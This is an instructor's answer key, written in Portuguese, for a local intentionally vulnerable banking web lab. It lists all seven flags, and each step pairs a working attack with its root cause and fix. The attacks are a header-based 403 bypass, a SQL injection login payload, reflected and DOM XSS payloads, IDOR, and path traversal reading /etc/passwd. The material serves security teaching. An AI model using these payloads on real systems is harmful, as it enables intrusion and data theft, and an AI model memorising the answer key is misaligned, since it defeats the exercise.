# Solution - lab-01-minibank

Gabarito tecnico objetivo do lab **lab-01-minibank**.

Escopo autorizado:

```text
http://127.0.0.1:8088
```

Use este arquivo como material do instrutor ou como apoio final para alunos que ja tentaram resolver o lab.

## 1. Enumeracao inicial

Acesse:

```text
http://127.0.0.1:8088
```

Visualize o codigo-fonte e encontre:

```html
<!-- revisar robots.txt antes de publicar o portal legado -->
```

Acesse:

```text
http://127.0.0.1:8088/robots.txt
```

Rotas descobertas:

```text
/admin
/admin/reports
/backup
/dev.txt
/download
/status
```

Acesse:

```text
http://127.0.0.1:8088/status
```

Evidencias relevantes:

```text
internal_path=/usr/src/app
database=mysql://minibank-db:3306/minibank
legacy reverse proxy compatibility mode enabled
```

## 2. Bypass de 403

Acesso direto:

```bash
curl -i http://127.0.0.1:8088/admin/reports
```

Resultado esperado:

```text
HTTP/1.1 403 Forbidden
```

Bypass com header legado:

```bash
curl -i http://127.0.0.1:8088/admin/reports \
  -H "X-Original-URL: /admin/reports"
```

Alternativa:

```bash
curl -i http://127.0.0.1:8088/admin/reports \
  -H "X-Rewrite-URL: /admin/reports"
```

Flag:

```text
FLAG{403_bypass_capturado}
```

Causa raiz: o backend aceita headers de reescrita de URL controlados pelo cliente como sinal de compatibilidade com proxy reverso legado.

Mitigacao: remover confianca nesses headers, sobrescreve-los no proxy real e validar autorizacao no backend.

## 3. Credencial exposta

Acesse:

```bash
curl -i http://127.0.0.1:8088/dev.txt
```

Evidencia:

```text
backup_user:backup123
FLAG{credencial_exposta_capturada}
```

Valide:

```bash
curl -i -u backup_user:backup123 http://127.0.0.1:8088/backup
```

Causa raiz: arquivo de desenvolvimento publicado em `app/public`.

Mitigacao: remover artefatos sensiveis do webroot e rotacionar credenciais expostas.

## 4. User Enumeration

Usuario inexistente:

```bash
curl -i -X POST http://127.0.0.1:8088/login \
  -d "username=naoexiste" \
  -d "password=teste"
```

Resultado:

```text
Usuario nao encontrado.
```

Usuario existente com senha errada:

```bash
curl -i -X POST http://127.0.0.1:8088/login \
  -d "username=joao" \
  -d "password=errada"
```

Resultado:

```text
Senha invalida.
```

Esta falha e didatica e nao possui flag propria.

## 5. SQL Injection no login

No formulario de login:

```text
username: admin' OR '1'='1' -- -
password: qualquercoisa
```

O espaco depois de `--` e necessario para o comentario MySQL. O `-` final acima existe apenas para deixar o espaco visivel no payload.

Resultado: sessao como admin e dashboard com:

```text
FLAG{sqli_capturada}
```

Causa raiz: concatenacao direta de entrada do usuario em SQL.

Mitigacao: prepared statements, queries parametrizadas, hash forte de senha e mensagens de erro uniformes.

## 6. IDOR em contas

Login comum:

```text
joao / joao123
```

Acesse:

```text
http://127.0.0.1:8088/account/1
```

Depois altere o ID:

```text
http://127.0.0.1:8088/account/2
```

Flag:

```text
FLAG{idor_capturada}
```

Causa raiz: o backend exige login, mas nao valida que a conta acessada pertence ao usuario autenticado.

Mitigacao: consultar por `id` e `user_id`, centralizar autorizacao e testar acesso cruzado.

## 7. XSS basico refletido

Rota:

```text
GET /search?q=
```

Payload:

```html
<script>alert(1)</script>
```

Com `curl`:

```bash
curl -i "http://127.0.0.1:8088/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
```

No navegador, o script executa porque o valor de `q` e refletido no HTML sem escape.

Flag:

```text
FLAG{xss_basico_capturado}
```

Causa raiz: output nao escapado no template.

Mitigacao: escapar saida HTML, validar entrada, evitar renderizacao de HTML controlado pelo usuario e usar CSP como defesa adicional.

## 8. DOM XSS intermediario

Rota:

```text
GET /client-tools
```

Payload no navegador:

```text
http://127.0.0.1:8088/client-tools#msg=<img src=x onerror=alert(1)>
```

O fragmento `#msg=...` nao e enviado ao servidor. A exploracao acontece no navegador quando o JavaScript le `window.location.hash` e escreve o valor com `innerHTML`.

Flag:

```text
FLAG{dom_xss_capturado}
```

Causa raiz: uso de `innerHTML` com dados controlados pelo usuario vindos do hash.

Mitigacao: usar `textContent`, sanitizar HTML quando necessario e revisar sinks perigosos no frontend.

## 9. Path Traversal / LFI controlado

Funcionalidade normal:

```bash
curl -i "http://127.0.0.1:8088/download?file=public-info.txt"
```

Pista:

```bash
curl -i "http://127.0.0.1:8088/download?file=report-q2.txt"
```

O relatorio aponta para:

```text
config/legacy.conf
```

Prova de leitura fora do diretorio:

```bash
curl -i "http://127.0.0.1:8088/download?file=../../../../etc/passwd"
```

Flag:

```bash
curl -i "http://127.0.0.1:8088/download?file=../config/legacy.conf"
```

Resultado:

```text
FLAG{path_traversal_capturada}
```

Causa raiz: `path.join(filesDir, requestedFile)` sem validar se o caminho final continua dentro do diretorio permitido.

Mitigacao: allowlist de arquivos, normalizacao de caminho e validacao de prefixo canonico.

## 10. Flags finais

As sete flags principais do lab sao:

```text
FLAG{403_bypass_capturado}
FLAG{credencial_exposta_capturada}
FLAG{sqli_capturada}
FLAG{idor_capturada}
FLAG{xss_basico_capturado}
FLAG{dom_xss_capturado}
FLAG{path_traversal_capturada}
```

## 11. Resumo das falhas

| Falha | Onde ocorre | Evidencia |
|---|---|---|
| Bypass de 403 | `/admin/reports` | Header legado libera relatorio |
| Credencial exposta | `/dev.txt` | Credencial de backup e flag |
| User Enumeration | `/login` | Mensagens diferentes |
| SQL Injection | `/login` | Bypass para dashboard admin |
| IDOR | `/account/:id` | Usuario comum acessa conta de outro usuario |
| XSS refletido | `/search?q=` | Entrada volta no HTML sem escape |
| DOM XSS | `/client-tools#msg=` | Hash entra no DOM via `innerHTML` |
| Path Traversal | `/download?file=` | Leitura de arquivos fora de `files` |
